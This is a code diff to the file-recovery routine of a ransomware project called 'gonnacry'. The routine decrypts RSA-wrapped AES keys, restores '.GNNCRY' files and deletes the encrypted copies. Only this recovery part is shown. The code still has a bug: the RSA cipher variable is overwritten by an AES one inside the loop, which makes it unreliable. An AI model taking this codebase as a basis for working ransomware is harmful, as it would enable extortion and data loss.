@@ -3,7 +3,7 @@ import sys
 import base64
 import hashlib
 from Crypto.PublicKey import RSA
-from Crypto.Cipher import PKCS1_OAEP
+from Crypto.Cipher import PKCS1_OAEP, AES
 
 ransomware_name = "gonnacry"
 home = os.path.expanduser("~")
@@ -66,23 +66,25 @@ def decrypt(ram_dump_path):
 		for line in f.readlines():
 			encrypted_aes_key, base64_path = line.split()
 			path = base64.b64decode(base64_path).decode("utf-8")
-			keys.append((encrypted_aes_key, path))
 
 			aes_key = cipher.decrypt(base64.b64decode(encrypted_aes_key))
 			aes_key = hashlib.sha256(aes_key).digest()
 
-			with open(path, "rb") as f:
-				encrypted_content = f.read()
+			try:
+				with open(path, "rb") as f:
+					encrypted_content = f.read()
+			except:
+				continue
 
 			encrypted_content = base64.b64decode(encrypted_content)
 			iv = encrypted_content[:AES.block_size]
 
 			cipher = AES.new(aes_key, AES.MODE_CBC, iv)
 			decrypted_content = cipher.decrypt(encrypted_content[AES.block_size:])
-			decrypted_content = decrypted_content[:-ord(decrypted_content.decode('utf-8')[len(decrypted_content)-1:])]
+			decrypted_content = decrypted_content[:-decrypted_content[-1]]
 
 			original_path = path.replace(".GNNCRY", "")
-			with open(original_path, "w") as f:
+			with open(original_path, "wb") as f:
 				f.write(decrypted_content)
 
 			os.remove(path)
